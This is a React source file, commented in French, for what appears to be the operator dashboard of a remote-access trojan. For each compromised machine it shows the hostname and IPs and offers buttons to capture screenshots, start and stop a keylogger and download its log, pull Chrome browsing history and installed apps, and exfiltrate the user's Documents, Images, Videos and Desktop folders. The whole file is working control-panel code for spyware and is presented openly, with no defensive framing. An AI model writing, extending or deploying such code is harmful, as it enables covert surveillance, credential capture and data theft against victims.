import { useState, useEffect, useRef } from 'react'
import { useParams, useNavigate } from 'react-router-dom'
import {
  ArrowLeft, Camera, Keyboard, Globe, Package, FolderOpen, Loader2,
} from 'lucide-react'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { Separator } from '@/components/ui/separator'
import { Skeleton } from '@/components/ui/skeleton'
import { fetchMachine, sendCommand, fetchResult, getDownloadUrl } from '@/services/api'
import { cn } from '@/lib/utils'

// Hook qui envoie une commande et poll le résultat toutes les 3s jusqu'à réception
function useCommand(machineId) {
  const [pending, setPending] = useState(false)
  const [result,  setResult]  = useState(null)
  const intervalRef = useRef(null)

  function stopPolling() {
    if (intervalRef.current) {
      clearInterval(intervalRef.current)
      intervalRef.current = null
    }
  }

  async function run(command) {
    stopPolling()
    setResult(null)
    setPending(true)
    try {
      await sendCommand(machineId, command)
      intervalRef.current = setInterval(async () => {
        const data = await fetchResult(machineId)
        if (data.result) {
          setResult(JSON.parse(data.result))
          setPending(false)
          stopPolling()
        }
      }, 3000)
    } catch {
      setPending(false)
    }
  }

  // Nettoyage au démontage du composant
  useEffect(() => () => stopPolling(), [])

  return { run, pending, result }
}

// Section générique : bouton "Déclencher" + affichage du résultat via children
function ActionSection({ title, icon: Icon, commandName, machineId, children }) {
  const { run, pending, result } = useCommand(machineId)
  return (
    <Card>
      <CardHeader className="pb-3">
        <div className="flex items-center justify-between">
          <CardTitle className="flex items-center gap-2 text-sm font-semibold">
            <Icon className="h-4 w-4 text-muted-foreground" />
            {title}
          </CardTitle>
          <Button
            size="sm" variant="outline"
            disabled={pending}
            onClick={() => run(commandName)}
            className="gap-2 h-7 text-xs"
          >
            {pending && <Loader2 className="h-3 w-3 animate-spin" />}
            {pending ? 'En cours...' : 'Déclencher'}
          </Button>
        </div>
      </CardHeader>
      {result && (
        <>
          <Separator />
          <CardContent className="pt-4">
            {children(result)}
          </CardContent>
        </>
      )}
    </Card>
  )
}

// Section keylogger : boutons Start / Stop + lien de téléchargement du log
function KeylogSection({ machineId }) {
  const [running, setRunning] = useState(false)
  const [status,  setStatus]  = useState(null)
  const { run, pending } = useCommand(machineId)

  async function toggle() {
    const cmd = running ? 'stop_keylog' : 'start_keylog'
    await run(cmd)
    setRunning(!running)
    setStatus(running ? 'Keylogger arrêté' : 'Keylogger démarré')
  }

  return (
    <Card>
      <CardHeader className="pb-3">
        <div className="flex items-center justify-between">
          <CardTitle className="flex items-center gap-2 text-sm font-semibold">
            <Keyboard className="h-4 w-4 text-muted-foreground" />
            Keylogger
          </CardTitle>
          <div className="flex items-center gap-2">
            {status && <span className="text-xs text-muted-foreground">{status}</span>}
            <Button
              size="sm"
              variant={running ? 'destructive' : 'default'}
              disabled={pending}
              onClick={toggle}
              className="gap-2 h-7 text-xs"
            >
              {pending && <Loader2 className="h-3 w-3 animate-spin" />}
              {running ? 'Stop' : 'Start'}
            </Button>
            <Button size="sm" variant="outline" className="h-7 text-xs" asChild>
              <a href={getDownloadUrl(machineId, 'keylog.txt')} download>
                Télécharger log
              </a>
            </Button>
          </div>
        </div>
      </CardHeader>
    </Card>
  )
}

// Détermine le badge de statut selon quand la machine a été vue pour la dernière fois
function getMachineStatus(lastSeen) {
  const diff = Date.now() - new Date(lastSeen).getTime()
  if (diff < 5 * 60 * 1000)  return { label: 'Online',  cls: 'border-primary/30 bg-primary/10 text-primary' }
  if (diff < 30 * 60 * 1000) return { label: 'Idle',    cls: 'border-yellow-500/30 bg-yellow-500/10 text-yellow-500' }
  return                              { label: 'Offline', cls: 'border-muted bg-muted/10 text-muted-foreground' }
}

// Affiche le résultat screenshot (image ou message)
function ScreenshotResult({ machineId, result }) {
  if (result.type !== 'file') {
    return <p className="text-xs text-muted-foreground">{result.data}</p>
  }
  return (
    <img
      src={getDownloadUrl(machineId, result.filename)}
      alt="screenshot"
      className="rounded-md border max-w-full"
    />
  )
}

// Affiche un tableau à partir d'un résultat JSON (history, apps)
function JsonTableResult({ result, columns }) {
  if (result.type !== 'json' || !Array.isArray(result.data)) {
    return <p className="text-xs text-muted-foreground">{String(result.data)}</p>
  }
  return (
    <div className="overflow-auto max-h-64 rounded-md border text-xs">
      <table className="w-full">
        <thead className="bg-muted/50 sticky top-0">
          <tr>
            {columns.map(c => (
              <th key={c.key} className="text-left p-2 font-medium text-muted-foreground">
                {c.label}
              </th>
            ))}
          </tr>
        </thead>
        <tbody>
          {result.data.map((row, i) => (
            <tr key={i} className="border-t hover:bg-muted/30">
              {columns.map(c => (
                <td key={c.key} className="p-2 truncate max-w-xs" title={String(row[c.key] ?? '')}>
                  {row[c.key]}
                </td>
              ))}
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  )
}

// Bouton par dossier avec son propre état de commande
function FolderButton({ folder, machineId }) {
  const { run, pending, result } = useCommand(machineId)
  return (
    <div className="flex flex-col gap-2">
      <Button
        variant="outline" size="sm"
        disabled={pending}
        onClick={() => run(`files:${folder}`)}
        className="gap-2 text-xs w-full"
      >
        {pending
          ? <Loader2 className="h-3 w-3 animate-spin" />
          : <FolderOpen className="h-3 w-3" />
        }
        {folder}
      </Button>
      {result?.type === 'file' && (
        <Button size="sm" variant="ghost" className="h-6 text-xs" asChild>
          <a href={getDownloadUrl(machineId, result.filename)} download>
            Télécharger {folder}.zip
          </a>
        </Button>
      )}
    </div>
  )
}

export default function MachineDetail() {
  const { id }    = useParams()
  const navigate  = useNavigate()
  const [machine, setMachine] = useState(null)
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    fetchMachine(id)
      .then(setMachine)
      .catch(() => setMachine(null))
      .finally(() => setLoading(false))
  }, [id])

  if (loading) {
    return (
      <div className="flex flex-col gap-6 p-6">
        <Skeleton className="h-8 w-64" />
        <Skeleton className="h-32 w-full" />
        <Skeleton className="h-32 w-full" />
      </div>
    )
  }

  if (!machine) {
    return (
      <div className="flex flex-col items-center gap-3 p-6">
        <p className="text-destructive text-sm">Machine introuvable</p>
        <Button variant="outline" size="sm" onClick={() => navigate('/')}>Retour</Button>
      </div>
    )
  }

  const status = getMachineStatus(machine.last_seen)

  const FOLDERS = ['Documents', 'Images', 'Videos', 'Bureau']

  return (
    <div className="flex flex-col gap-6 p-6">

      {/* En-tête : retour + infos machine */}
      <div className="flex items-center gap-3">
        <Button variant="ghost" size="icon" onClick={() => navigate('/')} className="h-8 w-8">
          <ArrowLeft className="h-4 w-4" />
        </Button>
        <div>
          <div className="flex items-center gap-2">
            <h1 className="text-xl font-semibold font-mono">{machine.hostname}</h1>
            <Badge variant="outline" className={cn('text-xs', status.cls)}>
              {status.label}
            </Badge>
          </div>
          <p className="text-xs text-muted-foreground mt-0.5">
            {machine.os_info}
            {machine.private_ip && ` · Privée : ${machine.private_ip}`}
            {machine.public_ip  && ` · Publique : ${machine.public_ip}`}
          </p>
        </div>
      </div>

      {/* Screenshot */}
      <ActionSection title="Screenshot" icon={Camera} commandName="screenshot" machineId={id}>
        {(result) => <ScreenshotResult machineId={id} result={result} />}
      </ActionSection>

      {/* Keylogger */}
      <KeylogSection machineId={id} />

      {/* Historique de navigation Chrome */}
      <ActionSection title="Historique Chrome" icon={Globe} commandName="browser_history" machineId={id}>
        {(result) => (
          <JsonTableResult result={result} columns={[
            { key: 'title',  label: 'Titre' },
            { key: 'url',    label: 'URL' },
            { key: 'visits', label: 'Visites' },
          ]} />
        )}
      </ActionSection>

      {/* Applications installées */}
      <ActionSection title="Applications installées" icon={Package} commandName="apps" machineId={id}>
        {(result) => (
          <JsonTableResult result={result} columns={[
            { key: 'name',    label: 'Application' },
            { key: 'version', label: 'Version' },
          ]} />
        )}
      </ActionSection>

      {/* Exfiltration de fichiers par dossier */}
      <Card>
        <CardHeader className="pb-3">
          <CardTitle className="flex items-center gap-2 text-sm font-semibold">
            <FolderOpen className="h-4 w-4 text-muted-foreground" />
            Exfiltration de fichiers
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
            {FOLDERS.map((folder) => (
              <FolderButton key={folder} folder={folder} machineId={id} />
            ))}
          </div>
        </CardContent>
      </Card>

    </div>
  )
}
